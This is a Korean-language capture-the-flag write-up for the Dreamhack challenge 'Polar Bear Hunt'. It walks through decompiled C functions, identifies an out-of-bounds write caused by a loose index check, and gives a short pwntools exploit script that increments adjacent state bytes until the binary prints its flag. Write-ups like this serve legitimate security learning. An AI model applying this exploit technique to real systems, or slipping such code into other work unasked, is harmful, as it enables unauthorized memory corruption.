# Polar Bear Hunt

[문제 링크](https://dreamhack.io/wargame/challenges/2922)

## 문제 분석

ida로 메인 함수를 확인하면 다음과 같이 나온다.

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  _BYTE v4[380]; // [rsp+0h] [rbp-180h] BYREF
  int v5; // [rsp+17Ch] [rbp-4h]

  sub_401216(a1, a2, a3);
  sub_40138D(v4);
  sub_40142D();
  while ( 1 )
  {
    sub_401549(v4);
    sub_4018E0();
    v5 = sub_40133D();
    if ( v5 == 4 )
      break;
    if ( v5 > 4 )
      goto LABEL_13;
    if ( v5 == 3 )
    {
      sub_401465(v4);
    }
    else
    {
      if ( v5 > 3 )
        goto LABEL_13;
      if ( v5 == 1 )
      {
        sub_4016FA(v4);
      }
      else if ( v5 == 2 )
      {
        sub_40179C(v4);
      }
      else
      {
LABEL_13:
        puts("The penguin hesitates.");
        sub_401694(v4);
      }
    }
  }
  puts("The penguin goes home hungry.");
  return 0;
}
```

메인 루프를 돌면서 사용자의 입력(`v5`)에 따라 분기합니다. 주요 동작을 파악하기 위해 내부 함수들을 하나씩 살펴보겠습니다.

## 초기화 함수 (`sub_40138D`)

이 함수는 루프 진입 전 `v4` (이하 `a1` 구조체) 변수의 값을 초기화합니다.

```c
__int64 __fastcall sub_40138D(__int64 a1)
{
  __int64 result; // rax
  int j; // [rsp+10h] [rbp-8h]
  int i; // [rsp+14h] [rbp-4h]

  *(_DWORD *)a1 = 12;
  *(_DWORD *)(a1 + 4) = 100;
  for ( i = 0; i <= 99; ++i )
    *(_BYTE *)(a1 + i + 8) = 0;
  *(_BYTE *)(a1 + 108) = 0;
  *(_BYTE *)(a1 + 109) = 0;
  *(_BYTE *)(a1 + 110) = 0;
  *(_BYTE *)(a1 + 111) = 0;
  *(_DWORD *)(a1 + 112) = 9999;
  result = a1;
  *(_DWORD *)(a1 + 116) = 2;
  for ( j = 0; j <= 255; ++j )
  {
    result = j;
    *(_BYTE *)(a1 + j + 120) = 0;
  }
  return result;
}
```

## 상태 점검 및 플래그 조건 (`sub_401549`)

`while` 문에서 가장 먼저 실행되는 상태 점검 함수입니다. 이 함수 내부에서 `sub_40127B()`가 호출되는데, 이 함수가 바로 **플래그(flag)를 출력해 주는 함수**입니다.

```c
__int64 __fastcall sub_401549(__int64 a1)
{
  __int64 result; // rax

  if ( *(int *)(a1 + 112) <= 0 )
  {
    puts("\nThe polar bear falls through the cracked ice.");
    sub_40127B();
  }
  result = *(unsigned __int8 *)(a1 + 108);
  if ( (unsigned __int8)result > 6u )
  {
    result = *(unsigned __int8 *)(a1 + 109);
    if ( (unsigned __int8)result > 2u )
    {
      puts("\nThe polar bear steps on too many fishbones.");
      puts("It loses balance on the ice.");
      *(_DWORD *)(a1 + 112) = 0;
      sub_40127B();
    }
  }
  return result;
}
```

## 플래그 출력함수(`sub_40127B`)

`sub_40127B`는 플래그를 실행하는 함수이다.

```c
void __noreturn sub_40127B()
{
  char s[136]; // [rsp+0h] [rbp-90h] BYREF
  FILE *stream; // [rsp+88h] [rbp-8h]

  stream = fopen("flag", "r");
  if ( !stream )
  {
    puts("flag file not found");
    exit(1);
  }
  if ( !fgets(s, 128, stream) )
  {
    puts("failed to read flag");
    fclose(stream);
    exit(1);
  }
  printf("%s", s);
  fclose(stream);
  exit(0);
}
```

즉, 플래그를 얻어 내기 위해서는 다음 두 가지 요건 중 하나를 만족하면 된다.

- `a1 + 112 <= 0`
- `a1 + 108 > 6 && a1 + 109 > 2`


<hr>

# 취약점 분석

위에서 찾은 두 가지 조건 중 어떤 것을 만족시킬 수 있는지 다른 함수들을 확인해 보았습니다.

**첫 번째 조건 분석 (북극곰 HP 감소):** 메뉴 1번(`sub_4016FA`)을 선택하면 펭귄이 북극곰을 공격합니다. 하지만 함수 코드를 보면 `puts("0 damage.");` 가 출력되며, 아무리 공격해도 곰의 체력(`a1 + 112`)은 감소하지 않습니다. 즉, **첫 번째 방법으로는 플래그를 획득할 수 없습니다.**

**두 번째 조건 분석 (OOB 취약점):** 메뉴 2번(`sub_40179C`)인 생선 먹기 함수를 살펴보면 아주 흥미로운 취약점이 존재합니다.

```c
__int64 __fastcall sub_40179C(_DWORD *a1)
{
  int v2; // [rsp+1Ch] [rbp-4h]

  // ... (생략) ...
    printf("Fish number: ");
    v2 = sub_40133D(); // 먹을 생선 번호 입력
    if ( (unsigned int)v2 < 108 )
    {
      if ( *((_BYTE *)a1 + v2 + 8) == 255 )
      {
      // ... (생략) ...
      else
      {
        // 취약점 발생 부분
        ++*((_BYTE *)a1 + v2 + 8);
        puts("The penguin recovers 1 HP.");
// ... (생략) ...
```

입력받은 생선 번호 `v2`가 `108` 미만인지 검증하는 로직이 있습니다. 하지만 값이 증가하는 실제 메모리 주소는 `a1 + v2 + 8`입니다. 만약 우리가 `v2`에 `100` 이상의 값을 넣는다면 어떻게 될까요? 원래 의도된 생선 배열 인덱스를 벗어나 다른 구조체 변수의 값을 덮어쓰는 **OOB(Out-of-Bounds Write)** 취약점이 발생합니다.

- `v2`에 **100**을 입력하면: `a1 + 100 + 8` = `a1 + 108` 위치의 값이 1 증가합니다.
- `v2`에 **101**을 입력하면: `a1 + 101 + 8` = `a1 + 109` 위치의 값이 1 증가합니다.

이 취약점을 활용하면 플래그 획득을 위한 두 번째 조건을 완벽하게 만족시킬 수 있습니다. 조건은 `*(a1 + 108) > 6` 그리고 `*(a1 + 109) > 2` 였으므로, **100번 생선을 7번 먹고, 101번 생선을 3번 먹으면** 플래그가 출력됩니다.

<hr>

# 익스플로잇

```python
from pwn import *
import sys

if (len(sys.argv) == 3):
    p = remote(sys.argv[1], sys.argv[2])
else:
    p = process('./polar_bear_hunt')

for i in range(7):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Fish number: ', b'100')

for i in range(3):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Fish number: ', b'101')

result = p.recvall(timeout=3).decode()
print(result)
```